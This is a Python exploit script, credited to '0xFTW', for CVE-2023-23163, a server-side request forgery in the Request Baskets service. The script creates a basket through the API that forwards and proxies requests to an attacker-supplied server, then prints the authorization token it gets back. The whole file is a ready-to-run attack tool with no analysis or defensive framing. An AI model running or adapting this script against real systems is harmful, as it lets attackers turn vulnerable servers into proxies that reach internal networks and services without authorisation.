#!/usr/bin/python3

import requests
import pyfiglet
import sys
import random
import string
import argparse

class ExploitRequestBaskets:

    def __init__(self,url,attack_server):
        self.url = url
        self.attack_server = attack_server

    def print_banner(self):
        ascii_banner = pyfiglet.figlet_format("CVE-2023-23163")
        print(ascii_banner)
        print("by 0xFTW")
        print("\r\n")

    def validate_arguments(self):
        if not self.url.endswith("/"):
            self.url += "/"
        if not self.url.startswith("http://") and not self.url.startswith("https://"):
            print("Malformed URL provided, exiting...", file=sys.stderr)
            print("[!] Please specify http:// or https:// before the URL\n")
            sys.exit(1)

    def run(self):
        self.print_banner()
        self.validate_arguments()
        basket_name = "".join(random.choice(string.ascii_lowercase) for _ in range(6))
        api_url = f"{self.url}api/baskets/{basket_name}"

        payload = {
            "forward_url": self.attack_server,
            "proxy_response": True,
            "insecure_tls": False,
            "expand_path": True,
            "capacity": 250
        }

        print(f"> Creating the \"{basket_name}\" proxy basket...")
        response = requests.post(api_url, json=payload)

        if response.status_code != 200:
            print(f"[!] FATAL: Could not properly request {api_url}. Is the server online?")
            sys.exit(1)

        basket_url = f"{self.url}{basket_name}"
        print("[+] Basket created!")
        print(f"[+] Accessing {basket_url} now makes the server request to {self.attack_server}.")

        try:
            authorization_token = response.json().get("token")
            if authorization_token:
                print(f"> Authorization: {authorization_token}")
            else:
                print(f"> Response body (Authorization): {response.text}")
        except ValueError:
            print(f"[!] Response body (Authorization): {response.text}")

        sys.exit(0)

def main():
    parser = argparse.ArgumentParser(description="Exploit Request Baskets Script")
    parser.add_argument("url", help="main path (/) of the server (eg. http://127.0.0.1:5000/)")
    parser.add_argument("attack_server", help="ATTACK_SERVER")
    args = parser.parse_args()
    exploit = ExploitRequestBaskets(args.url, args.attack_server)
    exploit.run()

if __name__ == "__main__":
    main()